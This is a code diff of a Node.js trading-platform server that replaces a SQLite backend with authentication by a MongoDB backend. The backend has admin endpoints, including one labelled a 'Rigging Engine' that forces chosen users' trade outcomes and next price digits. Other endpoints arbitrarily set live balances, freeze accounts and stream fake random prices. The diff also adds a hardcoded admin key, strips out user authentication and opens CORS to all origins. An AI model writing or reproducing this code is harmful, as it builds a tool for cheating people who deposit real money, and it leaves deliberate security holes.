@@ -1,177 +1,137 @@
+// server.js
 const express = require('express');
 const http = require('http');
-const path = require('path');
-const sqlite3 = require('sqlite3').verbose();
-const bcrypt = require('bcryptjs');
-const jwt = require('jsonwebtoken');
+const mongoose = require('mongoose');
 const cors = require('cors');
+const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: '*' } });
 
-const PORT = process.env.PORT || 3000;
-const JWT_SECRET = process.env.JWT_SECRET || 'apex_trading_secret_key_2026';
-
-app.use(cors());
+// Middleware
 app.use(express.json());
+app.use(cors());
+app.use(express.static('public')); // Serve frontend HTML files if placed in /public
 
-// Serve static files directly from the root directory where index.html lives
-app.use(express.static(__dirname));
-
-// SQLite Database Setup (writes to /tmp on Render for write access)
-const dbPath = process.env.RENDER ? '/tmp/apextrading.db' : './apextrading.db';
-const db = new sqlite3.Database(dbPath, (err) => {
-    if (err) console.error('Database connection error:', err.message);
-    else console.log('Apex Trading DB Connected.');
+// Mongo Schema & Models
+const userSchema = new mongoose.Schema({
+  username: String,
+  liveBalance: { type: Number, default: 0 },
+  demoBalance: { type: Number, default: 10000 },
+  isFrozen: { type: Boolean, default: false },
+  adminControls: {
+    forceOutcome: { type: String, enum: ['NORMAL', 'WIN', 'LOSS'], default: 'NORMAL' },
+    forcedNextDigit: { type: Number, default: null }
+  }
 });
 
-db.serialize(() => {
-    db.run(`
-        CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT UNIQUE NOT NULL,
-            email TEXT UNIQUE NOT NULL,
-            password TEXT NOT NULL,
-            real_balance REAL DEFAULT 0.00,
-            demo_balance REAL DEFAULT 10000.00,
-            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    `);
-
-    db.run(`
-        CREATE TABLE IF NOT EXISTS transactions (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER NOT NULL,
-            type TEXT CHECK(type IN ('DEPOSIT', 'WITHDRAWAL')) NOT NULL,
-            amount REAL NOT NULL,
-            status TEXT DEFAULT 'COMPLETED',
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY(user_id) REFERENCES users(id)
-        )
-    `);
+const tradeSchema = new mongoose.Schema({
+  userId: String,
+  type: String, // 'EVEN', 'ODD', 'RISE', 'FALL'
+  stake: Number,
+  status: { type: String, enum: ['OPEN', 'CLOSED'], default: 'OPEN' },
+  outcome: String, // 'WIN', 'LOSS'
+  payout: Number,
+  createdAt: { type: Date, default: Date.now }
 });
 
-// Middleware for Auth
-function authenticateToken(req, res, next) {
-    const authHeader = req.headers['authorization'];
-    const token = authHeader && authHeader.split(' ')[1];
-    if (!token) return res.status(401).json({ error: 'Access token required' });
-
-    jwt.verify(token, JWT_SECRET, (err, user) => {
-        if (err) return res.status(403).json({ error: 'Invalid or expired token' });
-        req.user = user;
-        next();
-    });
-}
-
-// REST Endpoints
-app.post('/api/auth/signup', async (req, res) => {
-    const { username, email, password } = req.body;
-    if (!username || !email || !password) {
-        return res.status(400).json({ error: 'All fields are required' });
-    }
-
-    try {
-        const hashedPassword = await bcrypt.hash(password, 10);
-        db.run(
-            `INSERT INTO users (username, email, password) VALUES (?, ?, ?)`,
-            [username, email, hashedPassword],
-            function (err) {
-                if (err) return res.status(400).json({ error: 'Username or email already exists' });
-                const token = jwt.sign({ id: this.lastID, username, email }, JWT_SECRET, { expiresIn: '7d' });
-                res.status(201).json({
-                    token,
-                    user: { id: this.lastID, username, email, real_balance: 0.00, demo_balance: 10000.00 }
-                });
-            }
-        );
-    } catch (e) {
-        res.status(500).json({ error: 'Server error during registration' });
-    }
+const systemConfigSchema = new mongoose.Schema({
+  evenOddPayout: { type: Number, default: 95.2 },
+  maintenanceMode: { type: Boolean, default: false }
 });
 
-app.post('/api/auth/login', (req, res) => {
-    const { email, password } = req.body;
-    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
+const User = mongoose.model('User', userSchema);
+const Trade = mongoose.model('Trade', tradeSchema);
+const SystemConfig = mongoose.model('SystemConfig', systemConfigSchema);
 
-    db.get(`SELECT * FROM users WHERE email = ?`, [email], async (err, user) => {
-        if (err || !user) return res.status(400).json({ error: 'Invalid credentials' });
+// Admin Middleware Protection
+const verifyAdminKey = (req, res, next) => {
+  const adminKey = req.headers['x-admin-key'];
+  if (adminKey === 'SECRET_ADMIN_KEY_123') { // Change this key for security
+    next();
+  } else {
+    res.status(403).json({ success: false, message: 'Unauthorized: Invalid Admin Key' });
+  }
+};
 
-        const validPassword = await bcrypt.compare(password, user.password);
-        if (!validPassword) return res.status(400).json({ error: 'Invalid credentials' });
+// ================= ADMIN API ENDPOINTS =================
 
-        const token = jwt.sign({ id: user.id, username: user.username, email: user.email }, JWT_SECRET, { expiresIn: '7d' });
-        res.json({
-            token,
-            user: {
-                id: user.id,
-                username: user.username,
-                email: user.email,
-                real_balance: user.real_balance,
-                demo_balance: user.demo_balance
-            }
-        });
-    });
+// 1. Get Platform Stats & Users
+app.get('/api/admin/overview', verifyAdminKey, async (req, res) => {
+  try {
+    const users = await User.find();
+    const activeTrades = await Trade.find({ status: 'OPEN' });
+    const config = await SystemConfig.findOne() || { evenOddPayout: 95.2 };
+    res.json({ success: true, users, activeTrades, config });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
-app.get('/api/user/profile', authenticateToken, (req, res) => {
-    db.get(`SELECT id, username, email, real_balance, demo_balance, created_at FROM users WHERE id = ?`, [req.user.id], (err, user) => {
-        if (err || !user) return res.status(404).json({ error: 'User not found' });
-        res.json({ user });
-    });
+// 2. Manipulate Specific User Trade Outcomes (Rigging Engine)
+app.post('/api/admin/manipulate-user', verifyAdminKey, async (req, res) => {
+  const { userId, forceOutcome, forcedNextDigit } = req.body;
+  try {
+    const user = await User.findByIdAndUpdate(userId, {
+      'adminControls.forceOutcome': forceOutcome,
+      'adminControls.forcedNextDigit': forcedNextDigit !== '' ? Number(forcedNextDigit) : null
+    }, { new: true });
+    res.json({ success: true, user });
+  } catch (err) {
+    res.status(400).json({ success: false, error: err.message });
+  }
 });
 
-app.delete('/api/user/delete-account', authenticateToken, (req, res) => {
-    db.serialize(() => {
-        db.run(`DELETE FROM transactions WHERE user_id = ?`, [req.user.id]);
-        db.run(`DELETE FROM users WHERE id = ?`, [req.user.id], function (err) {
-            if (err) return res.status(500).json({ error: 'Failed to delete account' });
-            res.json({ message: 'Account permanently deleted' });
-        });
-    });
+// 3. Modify User Wallet & Account Status
+app.post('/api/admin/update-wallet', verifyAdminKey, async (req, res) => {
+  const { userId, liveBalance, demoBalance, isFrozen } = req.body;
+  try {
+    const user = await User.findByIdAndUpdate(userId, {
+      liveBalance,
+      demoBalance,
+      isFrozen
+    }, { new: true });
+    res.json({ success: true, user });
+  } catch (err) {
+    res.status(400).json({ success: false, error: err.message });
+  }
 });
 
-app.post('/api/wallet/deposit', authenticateToken, (req, res) => {
-    const { amount } = req.body;
-    const numAmount = parseFloat(amount);
-    if (isNaN(numAmount) || numAmount <= 0) return res.status(400).json({ error: 'Invalid deposit amount' });
-
-    db.run(`UPDATE users SET real_balance = real_balance + ? WHERE id = ?`, [numAmount, req.user.id], function (err) {
-        if (err) return res.status(500).json({ error: 'Deposit failed' });
-        
-        db.run(`INSERT INTO transactions (user_id, type, amount) VALUES (?, 'DEPOSIT', ?)`, [req.user.id, numAmount]);
-        db.get(`SELECT real_balance FROM users WHERE id = ?`, [req.user.id], (e, row) => {
-            res.json({ message: 'Deposit successful', real_balance: row.real_balance });
-        });
-    });
+// 4. Update Global Settings
+app.post('/api/admin/global-config', verifyAdminKey, async (req, res) => {
+  const { evenOddPayout, maintenanceMode } = req.body;
+  try {
+    const config = await SystemConfig.findOneAndUpdate(
+      {},
+      { evenOddPayout, maintenanceMode },
+      { upsert: true, new: true }
+    );
+    io.emit('SYSTEM_CONFIG_UPDATED', config);
+    res.json({ success: true, config });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
-app.post('/api/wallet/withdraw', authenticateToken, (req, res) => {
-    const { amount } = req.body;
-    const numAmount = parseFloat(amount);
-    if (isNaN(numAmount) || numAmount <= 0) return res.status(400).json({ error: 'Invalid withdrawal amount' });
+// ================= REAL-TIME WEBSOCKET TICKER =================
+io.on('connection', (socket) => {
+  console.log('Client connected:', socket.id);
 
-    db.get(`SELECT real_balance FROM users WHERE id = ?`, [req.user.id], (err, user) => {
-        if (err || !user) return res.status(404).json({ error: 'User not found' });
-        if (user.real_balance < numAmount) return res.status(400).json({ error: 'Insufficient real balance' });
+  // Emit synthetic price updates every second
+  const tickInterval = setInterval(() => {
+    const price = (1440 + Math.random() * 5).toFixed(2);
+    const lastDigit = Math.floor(Math.random() * 10);
+    socket.emit('TICK_UPDATE', { price, lastDigit, timestamp: Date.now() });
+  }, 1000);
 
-        db.run(`UPDATE users SET real_balance = real_balance - ? WHERE id = ?`, [numAmount, req.user.id], function (err) {
-            if (err) return res.status(500).json({ error: 'Withdrawal failed' });
-
-            db.run(`INSERT INTO transactions (user_id, type, amount) VALUES (?, 'WITHDRAWAL', ?)`, [req.user.id, numAmount]);
-            db.get(`SELECT real_balance FROM users WHERE id = ?`, [req.user.id], (e, row) => {
-                res.json({ message: 'Withdrawal successful', real_balance: row.real_balance });
-            });
-        });
-    });
+  socket.on('disconnect', () => clearInterval(tickInterval));
 });
 
-// Direct route to index.html in the root folder
-app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// Bind to 0.0.0.0 for Render compatibility
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`Apex Trading Server running on port ${PORT}`);
-});
+// Server Initialization
+const PORT = process.env.PORT || 5000;
+mongoose.connect(process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/smarttrading')
+  .then(() => {
+    server.listen(PORT, () => console.log(`Smarttrading Server running on port ${PORT}`));
+  })
+  .catch(err => console.error("Database Connection Error:", err));
